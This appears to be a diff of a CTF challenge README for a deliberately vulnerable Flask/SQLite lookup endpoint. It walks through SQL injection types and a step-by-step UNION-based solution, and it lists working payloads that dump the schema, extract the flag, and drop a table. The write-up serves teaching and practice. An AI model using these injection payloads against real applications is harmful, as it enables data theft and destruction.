@@ -27,6 +27,7 @@ I increased the difficulty by prohibiting the use of '," and ; through using a n
 
 ## Indepth Build and Solution Notes
 
+### Build Section
 
 This CTF challenge is a tiny flask web app that usese SQLite. It exposes one endpoint which is the GET /lookup?uid=<value> that looks up a user's name by uid and prints it. 
 This task initially creates an sqlite file next to the script as a .db and it makes a flag of "flag{sqli_filtered}". It then creates 2 tables of users as users(uid, name) pre‑seeded with A/B/C and a very_secret(flag) containing the flag. At the lookup endpoint, the code gets a uid from the query string and blocks quotes and semicolons (returns HTTP 400) to stop obvious SQL payloads. The reason why SQL injections can appear for this task is because of the line 
@@ -42,47 +43,49 @@ To demonstrate this, here is a list of the common sql attacks and how they fail 
 | **Tautology** | **Yes** | **Yes** | `1 OR 1=1--` | WHERE becomes `uid = 1 OR 1=1` → many rows and app prints first (“A”). |
 | **String‑based tautology** | **No** (needs quotes) | **Yes** | `0 OR 'a'='a'--` | Quotes make it easy to force TRUE but blocked in filtered version. |
 | **UNION‑based** | **Yes** | **Yes** | `0 UNION SELECT flag FROM very_secret--` | Column count = 1 matches `name` and returns the flag.                                                               |
-| **UNION + targeted schema query** | **Harder** (no quotes for predicates) | **Easy** | `0 UNION SELECT sql FROM sqlite_master WHERE name='very_secret'--` | With quotes: directly filter to the target table; without quotes it’s simpler. |
-| **Boolean‑based blind** | **Possible** (using functions) | **Easier** (use quoted chars/LIKE)  | With filter: `1 AND substr((SELECT flag FROM very_secret),1,1)=char(102)--`  \| Without filter: `1 AND substr((SELECT flag FROM very_secret),1,1)='f'--` | You infer TRUE/FALSE by response difference (`User name: …` vs `Len=0`).                                         |
-| **Error‑based** | **Weak** (generic “SQL error” hides details) | **Still weak** (same masking) | `1'`  (causes syntax error) | App returns just “SQL error”, so you can’t infer from error text either way. |
+| **UNION + targeted schema query** | **Harder** (Solution Path) | **Yes** | `0 UNION SELECT sql FROM sqlite_master WHERE name='very_secret'--` | With quotes, it directly filter to the target table, without quotes, it’s simpler. |
+| **Boolean‑based blind** | **Possible** (sql functions) | **Easier** (use quoted chars/LIKE)  | With filter: `1 AND substr((SELECT flag FROM very_secret),1,1)=char(102)--`  \| Without filter: `1 AND substr((SELECT flag FROM very_secret),1,1)='f'--` | You can infer TRUE/FALSE by response difference (`User name: …` vs `Len=0`).                                         |
+| **Error‑based** | **Weak** (generic “SQL error” hides details) | **Still weak** (same masking) | `1'`  | App returns just “SQL error”, so you can’t infer from error text either way. |
 | **Time‑based blind** | **N/A** | **N/A** | **N/A** | SQLite doesn’t have a sleep functions |
 | **Stacked queries**  | **No** | **Yes** | `1; DROP TABLE users--` | `sqlite3.execute()` only allows one statement so stacked won’t run unless the app used `executescript()`. |
 
 
 
 
+### Solution Section
+
+
+0. Run the server
+Use python3 app.py in web-xss-csp
+Make sure that all dependencies are present
+head to the home page
 
 
 
+1. Normal Request as Recon
+- Request = `1`
+- Response = `User name: A`
+This confirms that there is a table and that it has a single-column at least
 
+2. Filter Behabiour
+- Request = `1;` or `1'`
+- Response = `Nice try`
+This confirms that the challenge has quotes and semicolon filtering, leading the user to not use quotes and instead use the union path.
 
-/lookup?uid=0 UNION SELECT 1--
+3. Cardinality of Column
+- Request = `0 UNION SELECT 1--`
+- Response = `User name: 1`
+This confirms that UNION is accepted in this task and allows for other UNION based request to be allowed
 
-Read schema to find hidden tables:
-/lookup?uid=0 UNION SELECT sql FROM sqlite_master--
+4. Schema enumeration
+- Request = `0 UNION SELECT sql FROM sqlite_master--`
+- Response = `CREATE TABLE ... very_secret(flag TEXT)`
+This confirms the target table and column names without using quotes and requires general knowledge of sqlite.
 
-Exfiltrate the flag:
-/lookup?uid=0 UNION SELECT flag FROM very_secret--
-
-Why it works: the base query returns one column (name), so a UNION SELECT <one column> fits; keywords (UNION, SELECT) and comments (--) don’t need quotes.
-
-
-FLAG insert
-
-cur.execute(f"INSERT INTO very_secret VALUES ('{FLAG}')") will break if FLAG contains a ' (single quote). It’s wrapped in try/except, so it silently fails. Use parameters instead.
-
-Regex per request
-
-Compiling the regex on every request is harmless but unnecessary overhead.
-
-
-
-
-
-
-
-
-
+5. Flag Extraction
+- Request = `0 UNION SELECT flag FROM very_secret--`
+- Response = `User name: flag{sqli_filtered}`
+This confirms that the exploit path works ad shows the in-band leakage. 
 
 
 
@@ -94,7 +97,7 @@ Compiling the regex on every request is harmless but unnecessary overhead.
 ---
 
 ### Sources
-
+* **OWASP testing Guide** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
 * **PentesterLab – SQL Injection** https://pentesterlab.com
 * **PayloadsAllTheThings – SQLi** https://github.com/swisskyrepo/PayloadsAllTheThings
 * **SQLite Docs** https://www.sqlite.org/lang_select.html
